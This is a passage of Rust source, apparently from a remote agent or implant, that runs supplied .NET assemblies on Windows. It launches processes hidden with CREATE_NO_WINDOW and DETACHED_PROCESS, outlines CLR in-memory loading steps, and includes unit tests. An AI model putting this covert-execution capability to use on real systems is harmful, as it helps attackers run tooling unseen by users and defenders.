            Ok(output) => {
                let stdout = String::from_utf8_lossy(&output.stdout).to_string();
                let stderr = String::from_utf8_lossy(&output.stderr).to_string();
                let exit_code = output.status.code().unwrap_or(-1);
                
                info!("✅ .NET assembly execution completed with exit code: {}", exit_code);
                debug!("Stdout length: {} bytes", stdout.len());
                debug!("Stderr length: {} bytes", stderr.len());
                
                CommandResult {
                    stdout: format!(
                        ".NET Assembly execution successful!\nExit code: {}\n--- STDOUT ---\n{}\n--- STDERR ---\n{}",
                        exit_code, stdout, stderr
                    ),
                    stderr: String::new(),
                    path: None,
                    req_id: None,
                }
            }
            Err(e) => {
                error!("Failed to execute .NET assembly: {}", e);
                CommandResult {
                    stdout: String::new(),
                    stderr: format!(".NET assembly execution failed: {}", e),
                    path: None,
                    req_id: None,
                }
            }
        }
    }
    
    /// Try executing with dotnet runtime
    #[cfg(target_os = "windows")]
    async fn try_dotnet_execution(
        path: &str,
        arguments: &[String],
    ) -> Result<std::process::Output, std::io::Error> {
        let mut cmd = tokio::process::Command::new("dotnet");
        cmd.arg(path);
        cmd.creation_flags(0x08000000 | 0x00000008); // CREATE_NO_WINDOW | DETACHED_PROCESS
        
        for arg in arguments {
            cmd.arg(arg);
        }
        
        debug!("Trying dotnet execution: dotnet {} {:?}", path, arguments);
        cmd.output().await
    }
    
    /// Try executing with .NET Framework
    #[cfg(target_os = "windows")]
    async fn try_framework_execution(
        path: &str,
        arguments: &[String],
    ) -> Result<std::process::Output, std::io::Error> {
        let mut cmd = tokio::process::Command::new(path);
        cmd.creation_flags(0x08000000 | 0x00000008); // CREATE_NO_WINDOW | DETACHED_PROCESS
        
        for arg in arguments {
            cmd.arg(arg);
        }
        
        debug!("Trying direct execution: {} {:?}", path, arguments);
        cmd.output().await
    }
    
    /// Non-Windows implementation
    #[cfg(not(target_os = "windows"))]
    pub async fn execute_assembly(
        _assembly_bytes: Vec<u8>,
        _arguments: Vec<String>,
        _app_domain_name: Option<&str>,
    ) -> CommandResult {
        error!(".NET assembly execution is only supported on Windows");
        CommandResult {
            stdout: String::new(),
            stderr: ".NET assembly execution is only supported on Windows".to_string(),
            path: None,
            req_id: None,
        }
    }
    
    /// Execute assembly with enhanced CLR hosting (advanced implementation)
    /// 
    /// This would be the full implementation using CLR hosting APIs
    /// Currently simplified for maintainability
    #[cfg(target_os = "windows")]
    pub async fn execute_assembly_advanced(
        assembly_bytes: Vec<u8>,
        arguments: Vec<String>,
        app_domain_name: Option<&str>,
    ) -> CommandResult {
        info!("🔬 ADVANCED: .NET CLR hosting implementation");
        warn!("⚠️  This would use full CLR hosting APIs in production");
        
        // This is where the full CLR hosting implementation would go:
        // 1. ICLRMetaHost::GetRuntime()
        // 2. ICLRRuntimeInfo::GetInterface() 
        // 3. ICorRuntimeHost::CreateDomain()
        // 4. AppDomain::Load_3() with byte array
        // 5. Assembly::EntryPoint::Invoke()
        // 6. Capture stdout/stderr redirection
        
        // For now, delegate to the simplified implementation
        Self::execute_assembly(assembly_bytes, arguments, app_domain_name).await
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    
    #[tokio::test]
    async fn test_execute_assembly_empty() {
        let result = DotNetExecutor::execute_assembly(vec![], vec![], None).await;
        assert!(!result.stderr.is_empty());
        
        #[cfg(target_os = "windows")]
        assert!(result.stderr.contains("empty"));
        
        #[cfg(not(target_os = "windows"))]
        assert!(result.stderr.contains("only supported on Windows"));
    }
    
    #[tokio::test]
    async fn test_execute_assembly_invalid_pe() {
        let invalid_pe = vec![0x00, 0x01, 0x02, 0x03]; // Not PE/MZ header
        let result = DotNetExecutor::execute_assembly(invalid_pe, vec![], None).await;
        
        #[cfg(target_os = "windows")]
        {
            assert!(!result.stderr.is_empty());
            assert!(result.stderr.contains("Invalid .NET assembly"));
        }
        
        #[cfg(not(target_os = "windows"))]
        {
            assert!(result.stderr.contains("only supported on Windows"));
        }
    }
    
    #[tokio::test]
    async fn test_execute_assembly_valid_pe_header() {
        // Create minimal PE header
        let mut pe_header = vec![0x4D, 0x5A]; // MZ header
        pe_header.extend_from_slice(&[0; 62]); // Minimal PE header size
        
        let args = vec!["test".to_string(), "args".to_string()];
        let result = DotNetExecutor::execute_assembly(pe_header, args, Some("TestDomain")).await;
        
        #[cfg(target_os = "windows")]
        {
            // Minimal MZ header is not a real assembly — execution must not "succeed" silently.
            // Accept any error text (COM/.NET host failures vary by host environment).
            assert!(
                !result.stderr.is_empty() || result.stdout.contains("fail") || result.stdout.is_empty(),
                "unexpected result stdout={} stderr={}",
                result.stdout,
                result.stderr
            );
        }
        
        #[cfg(not(target_os = "windows"))]
        {
            assert!(result.stderr.contains("only supported on Windows"));
        }
    }
    
    #[test]
    fn test_pe_header_validation() {
        // Test PE header validation logic
        let valid_pe = vec![0x4D, 0x5A, 0x90, 0x00]; // MZ header
        assert_eq!(&valid_pe[0..2], b"MZ");
        
        let invalid_pe = vec![0x7F, 0x45, 0x4C, 0x46]; // ELF header
        assert_ne!(&invalid_pe[0..2], b"MZ");
    }
}